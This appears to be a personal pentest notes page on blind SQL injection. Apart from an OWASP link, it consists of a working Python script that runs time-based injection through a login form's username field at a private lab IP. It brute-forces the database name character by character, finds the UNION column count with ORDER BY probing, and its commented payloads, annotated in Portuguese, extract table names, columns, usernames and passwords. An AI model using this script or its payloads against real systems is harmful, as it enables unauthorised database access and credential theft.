# Blind SQL Injection

{% embed url="https://owasp.org/www-community/attacks/Blind_SQL_Injection" %}

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

```python
import requests
import time
import string

#query = "' union select 1,2,if(substring((select database()),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" --> descobrir o nome do banco de dados
#query = "' union select 1,2,if(substring((select table_name from information_schema.tables where table_schema = 'cc' limit 0,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" --> descobrir os nomes das tabelas
#query = "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema='cc' limit 0,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" --> descobrir os nomes das colunas
#query = "' union select 1,2,if(substring((select login from users limit 0,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" --> descobrir o username
#query = "' union select 1,2,if(substring((select password from users limit 0,1),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" descobrir a senha

def req(query):
    url = "http://10.10.0.27" #CHANGE THIS
    data = {"username":query, "password":"aaas"}
    r = requests.post(url,data=data)
    return r.text


def fuzz():
    printables = string.printable
    nome_db = ""
    while True:
        for char in printables:
            guess_db = nome_db + char
            query = "' union select 1,2,if(substring((select database()),1,"+str(len(guess_db))+")='"+guess_db+"',sleep(3),NULL) -- -" 
            print(guess_db)
            antes = time.time()
            req(query)
            depois = time.time()
            total = depois - antes
            if int(total) >= 3:
                nome_db = guess_db
                break


def orderby(): 
    numeros = [1,2,3,4,5,6,7,8,9]
    for num in numeros:
        query = "' or 1=1 order by "+ str(num) + ' -- -'
        print(num)
        if not "Username or password is invalid!" in req(query):
            print(f'Union correct: {num}')

fuzz()
```

